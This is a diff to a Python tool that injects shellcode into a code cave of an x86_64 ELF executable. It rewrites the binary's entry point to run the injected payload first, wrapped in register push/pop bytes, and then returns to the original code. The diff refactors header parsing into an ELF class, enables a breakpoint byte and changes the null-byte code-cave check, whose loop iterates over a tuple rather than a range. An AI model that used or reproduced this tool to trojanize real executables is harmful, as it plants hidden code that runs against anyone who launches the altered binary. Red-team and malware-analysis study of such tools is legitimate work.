@@ -9,14 +9,15 @@
 
 from argparse import ArgumentParser
 from binascii import unhexlify
+from ELF import ELF
 import struct
 
-hexPrint = lambda x: " ".join(hex(i) for i in x)
+prettyHex = lambda x: (hex(x) if isinstance(x, int) else ' '.join(hex(i) for i in x))
 
 def gen_sc_wrapper(legit_e_entry, new_e_entry, shellcode):
     sc_wrapper = b""
     # sc_wrapper += b"\xcc" # bpoint
-    # sc_wrapper += b"\xcc"
+    sc_wrapper += b"\xcc"
     sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57" # pushes
     sc_wrapper += shellcode
     sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c\x5b\x48\x81\xeb" # popes
@@ -42,22 +43,22 @@ def main():
     with open(args.binary, "rb") as f:
         binData = f.read()
 
+    elf = ELF(binData)
+
     with open(args.shellcode, "rb") as f:
         shellcode = f.read()
 
     loc = int(args.location, 16)
 
-    if binData[:16] == bytearray([0x7f,0x45,0x4c,0x46,0x2,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0]):
-        e_entry_end = 0x20
-        p = lambda x: struct.pack('<Q', x)
-
-    else:
-        print("[!] Binary is not an ELF file or is not x86_64. Exiting...")
+    if elf.ei_mag != b"\x7f\x45\x4c\x46":
+        print("[!] Binary is not an ELF file. Exiting...")
         return 1
 
     safe_cc = True
     for i in (binData[loc], binData[loc]+len(shellcode), 1):
-        if binData[i] != '\x00':
+        off = loc+i
+        if binData[off] != 0x00:
+            print(f"Non null byte found in codecave at offset {prettyHex(off)}: {prettyHex(binData[off])}")
             safe_cc = False
 
     if not safe_cc:
@@ -66,10 +67,10 @@ def main():
 
     newBinData = b""
     newBinData += binData[:0x18]
-    legit_loc = struct.unpack("<Q", binData[0x18:e_entry_end])[0]
-    newBinData += p(loc)
-    newBinData += binData[e_entry_end:loc]
-    sc = gen_sc_wrapper(p(legit_loc)[:4], p(loc+5)[:4], shellcode)
+    legit_loc  = elf.e_entry
+    newBinData += elf.p(loc)
+    newBinData += binData[(0x18+len(elf.p(elf.e_entry))):loc]
+    sc = gen_sc_wrapper(elf.p(legit_loc), elf.p(loc+5), shellcode)
     newBinData += sc
     newBinData += binData[loc+len(sc):]
 
